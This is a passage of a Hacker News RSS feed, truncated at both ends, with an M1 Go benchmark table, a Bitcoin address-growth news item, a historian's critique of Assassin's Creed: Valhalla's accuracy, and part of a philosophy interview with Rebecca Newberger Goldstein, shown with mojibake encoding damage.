</td></tr><tr><td>LastIndexHard2</td><td>1.57ms Ã‚Â± 1%</td><td>1.31ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™16.03%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>LastIndexHard3</td><td>1.56ms Ã‚Â± 1%</td><td>1.32ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™15.83%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard1</td><td>113Ã‚Âµs Ã‚Â± 2%</td><td>329Ã‚Âµs Ã‚Â± 0%</td><td>+192.21%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard2</td><td>161Ã‚Âµs Ã‚Â± 9%</td><td>330Ã‚Âµs Ã‚Â± 1%</td><td>+105.44%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>CountHard3</td><td>644Ã‚Âµs Ã‚Â± 8%</td><td>356Ã‚Âµs Ã‚Â± 0%</td><td>Ã¢Ë†â€™44.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitEmptySeparator</td><td>12.2ms Ã‚Â± 5%</td><td>4.9ms Ã‚Â± 0%</td><td>Ã¢Ë†â€™59.71%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitSingleByteSeparator</td><td>1.46ms Ã‚Â± 3%</td><td>1.75ms Ã‚Â± 0%</td><td>+19.63%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitMultiByteSeparator</td><td>1.42ms Ã‚Â± 1%</td><td>1.20ms Ã‚Â± 2%</td><td>Ã¢Ë†â€™15.75%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitNSingleByteSeparator</td><td>207ns Ã‚Â± 9%</td><td>173ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™16.49%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>SplitNMultiByteSeparator</td><td>276ns Ã‚Â± 3%</td><td>212ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™23.22%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>Repeat</td><td>52.8ns Ã‚Â± 3%</td><td>33.4ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™36.75%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/1</td><td>4.78ns Ã‚Â± 2%</td><td>2.55ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™46.67%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/2</td><td>4.74ns Ã‚Â± 2%</td><td>2.51ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™46.96%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/4</td><td>4.80ns Ã‚Â± 3%</td><td>2.20ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™54.08%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/8</td><td>3.89ns Ã‚Â± 2%</td><td>2.06ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™46.95%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/16</td><td>3.86ns Ã‚Â± 2%</td><td>2.08ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™46.21%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/32</td><td>5.09ns Ã‚Â± 6%</td><td>2.55ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™49.96%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/64</td><td>5.99ns Ã‚Â± 1%</td><td>3.45ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™42.43%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/128</td><td>7.95ns Ã‚Â± 3%</td><td>5.32ns Ã‚Â± 0%</td><td>Ã¢Ë†â€™33.06%</td><td>(p=0.016 n=5+4)
</td></tr><tr><td>BytesCompare/256</td><td>11.6ns Ã‚Â± 9%</td><td>9.1ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™21.88%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/512</td><td>18.9ns Ã‚Â± 9%</td><td>16.7ns Ã‚Â± 1%</td><td>Ã¢Ë†â€™11.36%</td><td>(p=0.008 n=5+5)
</td></tr><tr><td>BytesCompare/1024</td><td>32.7ns Ã‚Â± â€¦</td></tr></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://roland.zone/m1-go-benchmarks/">https://roland.zone/m1-go-benchmarks/</a></em></p>]]>
            </description>
            <link>https://roland.zone/m1-go-benchmarks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25158243</guid>
            <pubDate>Fri, 20 Nov 2020 07:59:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Increase in Bitcoin Addresses as More People Join the BTC Price Surge]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 103 (<a href="https://news.ycombinator.com/item?id=25157946">thread link</a>) | @coincolony
<br/>
November 19, 2020 | https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/ | <a href="https://web.archive.org/web/*/https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Itâ€™s been nearly three years since the Bitcoin price has reached a benchmark of over $15k and it doesnâ€™t seem to be stopping. But, itâ€™s not just the price of BTC that is overflowing. New Bitcoin addresses have also skyrocketed.<span>&nbsp;</span></p>
<p>On November, 18th, one week after Bitcoin broke its 15K boundary, <a href="https://twitter.com/glassnode/status/1329045245212971010?s=20">Glassnode</a>, a crypto-analysis company, tweeted an unusually high number of BTC accounts being created.<span>&nbsp;</span></p>
<blockquote>
<p dir="ltr" lang="en">In the past hour we observed the highest number of newly created addresses in the <a href="https://twitter.com/hashtag/Bitcoin?src=hash&amp;ref_src=twsrc%5Etfw">#Bitcoin</a> network since January 2018 ğŸ“ˆ</p>
<p>Chart: <a href="https://t.co/fTmoH5ezNw">https://t.co/fTmoH5ezNw</a> <a href="https://t.co/INq7sEEtoM">pic.twitter.com/INq7sEEtoM</a></p>
<p>â€” glassnode (@glassnode) <a href="https://twitter.com/glassnode/status/1329045245212971010?ref_src=twsrc%5Etfw">November 18, 2020</a></p></blockquote>

<p>According to Glassnode, the address per hour rate increased to almost 25,000, a rate not seen since January 2018 when BTC hit $20k.<span>&nbsp;</span></p>
<p>To put this number into perceptive, the most Bitcoin address ever created within a 24-hour period was on December 21, 2017 when nearly 600,000 popped up. Will we see this FOMO craze again if <a href="https://coincolony.net/bitcoin-technical-analysis-can-we-see-20k-again/">BTC hits $20k</a> by the end of the year?</p>
<p>We have seen a steady rise in public BTC implementation as well as business incorporation this year. This caused the price of BTC to go from $4k at the beginning of 2020 to $18k currently.<span>&nbsp;</span></p>
<p>However, universal usage is still minuscule with as much as <a href="https://www.jbs.cam.ac.uk/wp-content/uploads/2020/08/2017-04-20-global-cryptocurrency-benchmarking-study.pdf">5.8 million cryptocurrency wallets</a> active in 2017. That equates to less than .1% of the global population own crypto.<span>&nbsp;</span></p>
<p>It will be interesting to see the adoption rates increase as the BTC price continues to rise and steady at a price that most people feel comfortable enough to buy, use, and save longterm.<span>&nbsp;</span></p>
<p>If you are just getting started with buying cryptocurrency then read our <a href="https://coincolony.net/8-ways-to-avoid-cryptocurrency-scams/">8 Ways to Avoid Cryptocurrency Scams</a>.</p>
<p><span>Advertisement </span><a href="https://coincolony.net/recommends/bybit/"><img width="728" height="90" alt="Bybit " src="https://files.coincolony.net/wp-content/uploads/2020/11/1.png"></a>
</p> </div></div>]]>
            </description>
            <link>https://coincolony.net/increase-in-bitcoin-addresses-as-more-people-join-the-btc-price-surge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157946</guid>
            <pubDate>Fri, 20 Nov 2020 07:01:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Kingdoms face off! (Procedural Simulation)]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157741">thread link</a>) | @CalderWhite
<br/>
November 19, 2020 | https://calderwhite.github.io/KingdomsAndCrusaders | <a href="https://web.archive.org/web/*/https://calderwhite.github.io/KingdomsAndCrusaders">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://calderwhite.github.io/KingdomsAndCrusaders</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157741</guid>
            <pubDate>Fri, 20 Nov 2020 06:10:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Assassinâ€™s Creed: Valhalla and the Unfortunate Implications]]>
            </title>
            <description>
<![CDATA[
Score 66 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25157722">thread link</a>) | @parsecs
<br/>
November 19, 2020 | https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Weâ€™re going to be a bit silly this week (in part because the ending of this compressed semester has left me with little time) and talk about the recently released historical action-RPG computer (and console) game, <em>Assassinâ€™s Creed: Valhalla</em>, set in 9th century Norway and England.</p>



<p>And, as with the last time we did this, I should note that this isnâ€™t a <em>game review</em>.  As a <strong>game</strong>, <em>AC: Valhalla</em> is perfectly serviceable and quite fun.  I donâ€™t think it got the same amount of developer time as its predecessor, <em>Odyssey</em>, but it is also a more focused experience than <em>Odyssey</em> was, which runs to its benefit.  Everything here basically works and while I find some of the game design decisions puzzling (the largest being how long the game makes you wait <em>hours </em>before you have a full set of all three armor types and all weapon types, given that you may be getting bonuses to them in the skill tree many hours before you find <em>any at all</em>), <strong>it is overall fine.  Itâ€™s fun.</strong></p>



<figure><img data-attachment-id="5179" data-permalink="https://acoup.blog/20201114012112/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20201114012112" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/11/20201114012112.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>It also lets you snuggle the cats.  I am very big on this choice.</figcaption></figure>



<p>But you arenâ€™t here for my game reviews. You are here for me to talk about the <em>history</em> behind the game.  And normally, I would leave a product like this alone (this is only thinly historical fiction, given the crazy background plot that ties the games together).  But each <em>Assassinâ€™s Creed</em> game includes not just meticulous recreations of historical <em>places</em> (and to be clear, I mean the physical buildings and landscapes, not the cultures or politics, but also some form of this statement:</p>



<blockquote><p>Inspired by historical events and characters, this work of fiction was designed, developed, and produced by a multicultural team of various beliefs, sexual orientations and gender identities.</p></blockquote>



<p>(yes, the odd decision to use and then not use the Oxford comma is preserved from the original).  That is <em>Valhallaâ€™s </em>version of the statement.  <strong>That statement is making a claim about the product that follows</strong>.  Some of those claims are explicit (this is based on real history at some level) and some are implicit (our diverse team means this game was produced in a careful, sensitive way).  <strong>And those claims deserve interrogation.</strong></p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>






<h2>The Nitpicks</h2>



<p>My thoughts on <em>Valhalla</em> fit into two main categories: complaints of historical accuracy that I think are largely unimportant, but fun to note, and<strong> complaints about tone and framing which I think <em>are</em> important and worth discussing</strong>.  <strong>We can start with the frivolous stuff</strong>.  If you want to skip to the meat of the analysis, you are welcome to jump right to the next section, but I know some folks like to know about this stuff, so here it is.</p>



<p><strong>First off, because it is a core area of my specialty: the weapons and armor.  </strong>The military equipment we see here is very hit-or-miss and<strong> there are honestly quite a lot of misses</strong>.  They at least have, for the most part, the relatively light design of battle axes correct, in both their two-handed and one-handed varieties.  And I can understand from a game design standpoint the decision to not give the player a one-handed sword and to instead fill that role with the more iconic one-handed axe; NPCs use one-handed swords, so it isnâ€™t that they donâ€™t exist, merely that our character doesnâ€™t prefer them.  Technically, sword-and-shield and spear-and-shield are both possible, but only with a high level perk, which is pretty silly given that these were the most common non-elite fighting styles of the era by some distance.</p>



<p>But things go poorly from there.  There is a â€˜flailâ€™ type weapon, despite â€“ <a href="https://acoup.blog/2019/06/07/collections-the-siege-of-gondor-part-v-just-flailing-about-flails/">as weâ€™ve discussed</a>, actually â€“ flail chain weapons being both not of this period, poorly attested in general and also not common in this part of the world in <em>any </em>period.  The large two-handed swords â€“ the only kinds of swords the player can use â€“ are around <em>three hundred</em> years too early and donâ€™t really resemble their later variations either (they are much too thick and heavy, being mostly up-scaled period swords, which makes them look absurd).  And yes, there were two-handed swords in antiquity in Thrace and Illyria (the falx and rhomphaia) but this is both not that part of the world, not antiquity, and these are not those swords.  I am befuddled that, with two other two-handed weapons that fit the period (a thrusting spear and a two-handed axe) that they felt the need to include â€˜greatswords.â€™  Also, they are carried by way of back-scabbards, whichâ€¦sighâ€¦no.</p>



<p><strong>The armor is generally a bigger â€˜missâ€™ than the weapons.</strong>  There is a <em>lot</em> of soft â€˜leatherâ€™ armor here of exactly the sort that was not used historically.  What is baffling uncommon is <em>mail</em> â€“ especially among the Norse and Danes (thereâ€™s a bit more mail on the Saxons) â€“  which would have been, in this period, by far the most common metal body protection.  Pretty much all of Eivorâ€™s warrior band ought to be wearing mail.  Instead, there is a lot of scale armor; scale was certainly used in this period in England, but it was a lot less common than mail (there are also things like brigandine armor roughly 400 years too early).  I have noticed a real trend of game developers using lots of scale armor when mail would be more correct; I wonder if it is easier for an art-team to produce the assets for it or if they think it looks cooler.  But in any event, audiences looking for a realistic sweep of ninth century equipment will not find it here.  I would say, for the more â€˜exoticâ€™ player armors, that I think the developers here missed a trick â€“ the game sets up early that we have people from the Near East and even the Far East in the playerâ€™s clan.  I think that would set up an opportunity to have the honestly rather more varied and potentially visually interesting armors from the Near East â€“ a lot more scale, but also Near Eastern lamellar or even Chinese-style lamellar coats.  Alas, no.</p>



<figure><img data-attachment-id="5171" data-permalink="https://acoup.blog/20201115222400/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20201115222400" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/11/20201115222400.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Barbarian-fashion, with nonsense biker-leather armor and lots of random, unkempt fur.  Even vikings <strong>cared</strong> about their appearances!</figcaption></figure>



<p>In terms of <em>clothing</em>, it is both hit and miss, but a bit more hit than miss compared to equipment.  Some of the Norse and Danish wear is â€˜hollywood barbarianâ€™ (lots of rough fur, inexplicably low-coverage clothing in freezing climates, lots of random leather) which remains truly frustrating.  But <em>most</em> of the clothing isnâ€™t this way.  One odd area is color: <strong>medieval clothing, contrary to what you often see in films, was <em>colorful</em>, often with lots of bold primary colors</strong> (bright reds, yellows, greens, blues).  In <em>Valhalla</em>, the developers have opted to use clothing color to signify faction (friendly Danes wear green, the Norse blue, hostile Danes red, hostile Saxons yellow) and to keep non-combatants in drab colors.  I get the design reason (they want you to pay attention to enemies, not non-combatants) but it is frustrating, apart from the monks, that this makes so many of the townsfolk drab and dull.  <strong>Still, it was very nice to see Norse and Danes in bright primary colors, often with lovely border-stitching on their clothes and lots of clear care.</strong></p>



<p>In terms of architecture, I very much like that buildings in settlements, especially high status ones, are often well built, with lots of designs and carving work in the wood.  I am less thrilled with the way churches are done: typically in plain stone with plaster; some color is often added by lighting effects through stained glass.  But these are medieval Catholic churches, they should be brightly painted and colored in the interior and in most cases â€“ <em>especially</em> in big towns and monasteries â€“ very well kept up.  If you want to see this done better, <strong><em>Kingdom Come: Deliverance</em> is a deeply flawed game that nevertheless does medieval town architecture and clothing quite a lot better</strong> (but maybe watch a Letâ€™s Play; while <em>KC:D </em>is fun once it gets properly going, itâ€™s a case where I donâ€™t think the juice is worth the squeeze; I invested the time to get properly into the game and I donâ€™t think it was really worth it).</p>



<figure><img data-attachment-id="5170" data-permalink="https://acoup.blog/20201114231046/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg" data-orig-size="1920,1080" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="20201114231046" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/11/20201114231046.jpg 1920w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>One of Valhallaâ€™s inexplicably bland churches.  Also, why are the big banners so ragged and faded?  This is an active religious center!  It would be kept <strong>clean</strong> and <strong>well cared for</strong>!</figcaption></figure>



<h2>Diversity</h2>



<p>This isnâ€™t really a nitpick or a substantive issue, so I am giving it its own section in between the two.  Let me be frank: <strong>I fully understand the desire of the developers to deviate from history on some of these points in order to make a more inclusive game</strong>.  These games do not market themselves as pure historical simulations, so this does not bother me; in fact I think it is broadly a positive thing that game studios are doing this (so long as they are <em>open</em> about fudging the history).  So if you were hoping for a lot of table-pounding here, you are bound to be disappointed.  Still, weâ€™re assessing the game historically, so it seems worthwhile to point some of these things out.</p>



<p>First, on gender diversity, so far the game has built up a quiet contrast between the English, who are gender-stratified, and the Norse and Danes, who are much less so.  Saxon troopers are all male, but Danish and Norse NPCs include women.  All of the Saxon leaders Iâ€™ve met so far in the game are male, while one of the first jarls you meet in England is a woman ruling in her own name.  Saxon clothing is sharply gendered (men in pants, women in dresses), but Norse and Danish clothing generally isnâ€™t (which is a clear design choice, since this is very much <em>not</em> true historically).  And, as with <em>AC: Odyssey</em>, if you play a female main character, absolutely no one seems to care or notice.</p>



<p>Now, on the one hand, there isnâ€™t <em>nothing</em> to this characterization.  <a href="https://en.wikipedia.org/wiki/Shield-maiden">â€˜Shield-maidensâ€™</a> do show up in the â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/">https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/11/20/miscellanea-my-thoughts-on-assassins-creed-valhalla/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25157722</guid>
            <pubDate>Fri, 20 Nov 2020 06:04:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Plato at the Googleplex: Why Philosophy Won't Go Away]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25157681">thread link</a>) | @unquote
<br/>
November 19, 2020 | https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab | <a href="https://web.archive.org/web/*/https://www.3-16am.co.uk/articles/plato-g%C3%B6del-spinoza-ahab">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"> <div>  <nav id="mainNavMobile">    </nav>  <div id="s123PjaxMainContainer"> <div><section id="section-5c96048e70e5c">   <div> <div> <div> <div> <img src="https://cdn-cms.f-static.net/uploads/2029468/2000_5fb4f96199039.jpg"> </div> <div> <div><div><p>Interview by Richard Marshall</p><p><img src="https://cdn-cms.f-static.net/uploads/2029468/2000_5fb4f01c1c2a1.png"></p><p>'<em>Philosophical advances in epistemology and in ethics profoundly shape our points of view. We donâ€™t see them precisely because we see with them. Itâ€™s like the fish who responds to the question â€œHowâ€™s the water today?â€ with â€œWater? Whatâ€™s water?â€'</em></p><p><em>'GÃ¶del proved that, in any formal system that is rich enough to express arithmetic, there are truths that are expressible within it that canâ€™t be proved. Thatâ€™s the First Incompleteness Theorem.&nbsp;The second is that one of the things that canâ€™t be proved within such a formal system is its own consistency.'</em></p><p><em>'Since GÃ¶del had interpreted his First Incompleteness Theorem in the light of his mathematical realism, then yes, postmodernists are barking up the wrong tree. The proof shows that there is a mathematical truthâ€”the GÃ¶del sentenceâ€”that is not provable within the system. Heâ€™s not in any way attacking the notion of objective truth in mathematics. Quite the contrary.'</em></p><p><em>'Spinoza, the great monist, objected to dualities in just about every domain. He was everywhere interested in fusing, in unifying, what seemed to be polarities, collapsing dualities. The supernatural is fused with the natural, the ontological with the logical (which is entailed in his a priori methodology), the mental with the physical, the intellectual with the emotional, the normative with the descriptive.'</em></p><p><em>'Maybe Reality really is inconsistent with the reality of the self, and maybe then, driven by our conatus, we ought to resist Reality. Thatâ€™s the path that Ahab takes, and it doesnâ€™t end well for him, nor for those under his leadership, who have relinquished their wills to his. After all, why is it even worthwhile to struggle to know Reality, to struggle after anything at all, if the self thatâ€™s motivating the struggle is ultimately nothing at all?</em>'</p><p><img src="https://cdn-cms.f-static.net/uploads/2029468/2000_5fb4f9aa5c205.jpg"></p><p><a href="http://www.santafe.edu/people/profile/rebecca-goldstein"><u>Rebecca Newberger Goldstein</u></a> is an American philosopher, novelist and public intellectual. She has written ten books, both fiction and nonfiction. Here she discusses the relationship between science and philosophy, the nature of philosophical progress, GÃ¶delâ€™s theorems, Incompleteness, Einstein, Realism and postmodernism, GÃ¶del and Wittgenstein, Spinoza, Spinoza and his appeal to imaginative writers, the Spinoza War, and Moby Dick.</p><p><strong>3:16:</strong> What made you become a philosopher?</p><p><strong>Rebecca Newberger Goldstein</strong> <strong>:</strong>&nbsp; I started out mostly interested in math and physics. There were problems that obsessed me in both fieldsâ€”How can math be <em>a priori</em>? How can quantum mechanics be connected to a reality that is recognizably our own? I discovered, while in college, that these were actually philosophical problems. My senior year in college I went to speak to one of my professors, Sidney Morgenbesser, an amazing guy. He was the Socrates of his day. Socrates never published anything, but instead engaged in deeply probing dialogues. That was Sidneyâ€™s m.o. as well. Over the course of several long conversations Sidney convinced me that I was a philosopher, rather than a scientist. His clinching argument was that scientists are like the bourgeoisie, never questioning the system, whereas philosophers were like socialists, always examining the system critically: even if it seemed to be working, <em>ought</em> it to be working? That argument struck home. I basically applied to graduate school in philosophy on the strength of Sidneyâ€™s metaphor.&nbsp;</p><p><img src="https://cdn-cms.f-static.net/uploads/2029468/2000_5fb4ed28d1e2b.png"></p><p><strong>3:16:</strong> In your book <u>â€˜<a href="http://www.amazon.co.uk/gp/product/B00KEW8KC4/ref=dbs_a_def_rwt_hsch_vapi_tkin_p1_i1">Plato at the Googleplex</a>â€™ y</u>ou have Plato brought into our century to discuss philosophy with our contemporaries. So first, can you say what you take philosophy to be and why you think it hasnâ€™t gone away and isnâ€™t going away soon?</p><p><strong>RNG:</strong> I think that philosophy is the systematic and rigorous investigation of one of the deepest urges that we humans have, which is the urge to get our bearings in the most general sense possible. In particular, (1) We want to know where we are. What is the nature of this universe in which we find ourselves? What fundamentally different kinds of things, belonging to different ontological categories, are there, and how do they operate? 2. We want to know our own place in the universe, whether weâ€™re made of the same stuff, are a special category of being, and whether the universe itself has any attitudes towards us. 3. We want to know what we are meant to do with our lives. We want to know what it is to live a life worthy for a human to live, a good life.&nbsp;</p><p>The first two questions are ontological, the third is normative. Science, as it eventually developed, has the lead role in answering the ontological questions, but science is often pushed on by philosophy, in its critical probing role. And the more subtle the science becomes, the bigger the role for philosophy, since it falls to philosophyâ€™s special techniques to figure out what is and isnâ€™t entailed by the science. For example, what changes are we required to make to our concept of time in light of Relativity Theory? And as far as the normative questions go, there the ball falls squarely in philosophyâ€™s court, though itâ€™s sometimes advancements in science and technology that generate the balls, that is, new normative questions.&nbsp;</p><p>Consider the normative questions generated by advances in AI, or the question of what obligations we have to future generations, given the threat of climate change. As long as science and technology advance, philosophers will have new questions to work on.</p><p><strong>3:16:</strong>&nbsp; You place Plato in rooms having philosophical debates with all sorts of people but you never have him decisively concluding a debate or argument. For those hostile to philosophy this might be a hostage to fortune â€“ it suggests that philosophy canâ€™t decide anything and actually we would be better off listening to scientists, historians and novelists. Why should we heed the philosopher in our time if not even Plato can answer its questions? What do you say to those physicists who say philosophy is just pointless and has been supplanted by â€“ well, in their case â€“ physics?&nbsp;</p><p><strong>RNG:</strong> When it comes to ontology, I would argue that itâ€™s science that plays the leading role. But Iâ€™d have to offer a philosophical argument to support that conclusion. I'd first have to both differentiate what is essential to science, how it differs from other fields of inquiry, including philosophy, and Iâ€™d have to argue for scientific realism, that is argue that science is in the business of ontology. Both of those are conclusions that canâ€™t be empirically established, i.e. they are philosophical. So one canâ€™t even make the case for science, ontologically speaking, without engaging in philosophy. And as far as the normative questions go, we are entirely in the philosophical sphere. And here I do think philosophy has offered us answers, answers which have as fundamentally changed our lives, and for the better, as the technological advances that science has given us.&nbsp;</p><p>As just one example, consider the idea of human rights. One of my points in my having Plato engage in those philosophical dialogues in which itâ€™s not he who supplies the answer, but instead he is rather surprised by being philosophically instructed by some â€œregularâ€ people, was to demonstrate the progress weâ€™ve made since Plato, progress that has been disseminated and seeped into the points of view of non-philosophers. In the first dialogue a rather down-to-earth character, a media escort, explains to Plato in very commonsensical terms why slavery is wrong. Plato had argued that itâ€™s wrong for Greeks to enslave other Greeks, which was an advance over the norm taken for granted by his society, but he never universalized the conclusion. Nor did Aristotle, who argued that some people are naturally suited to be slaves. So if I donâ€™t have Plato having all the answers itâ€™s often to show progress made in the millennia since he lived, or to show that our new conditions, many of them created by scientific and technological advances, generate new philosophical problems--in other words to show that philosophy will never go away. My showing Plato to be often instructed and/or stumped is meant to challenge the view that philosophy remains static.</p><p><strong>3:16:</strong>&nbsp; So this leads to one of the issues you raise in the book - the notion of philosophical progress. So what do you take to be the progress philosophy has made since Plato and why is it invisible to many, unlike science?&nbsp;</p><p><strong>RNG:</strong> Philosophical advances in epistemology and in ethics profoundly shape our points of view. We donâ€™t see them precisely because we see with them. Itâ€™s like the fish who responds to the question â€œHowâ€™s the water today?â€ with â€œWater? Whatâ€™s water?â€ When people hold the view, for example, that science has discovered that simultaneity is not absolute, as counter-intuitive as that seems, or that chattel slavery is an abomination, which once also had seemed counter-intuitive, they donâ€™t realize the laborious philosophical reasoning that had laid the groundwork for their views. It takes philosophical work to claim that science can correct our fundamental views of the way the world is. It takes philosophical work to claim that we can discover, without consulting any holy books (that in fact sanction slavery), truths about the way humans can and canâ€™t be treated. Philosophy is committed to the view that we can use human reason to come to ethical conclusions, overcoming biases, tradition, and religious authority. Just the other week the Pope gave his approval to civil unions for gay people. That is the slow progress of the philosophical idea of human rights working its way out. You could even consider such changes in ethical attitudes, eventually making their way even to the Vatican, as philosophyâ€™s own technological products, the practical application of philosophical conclusions, analogous to the technological goodies that have come from science. In fact, you can even regard science itself as one of 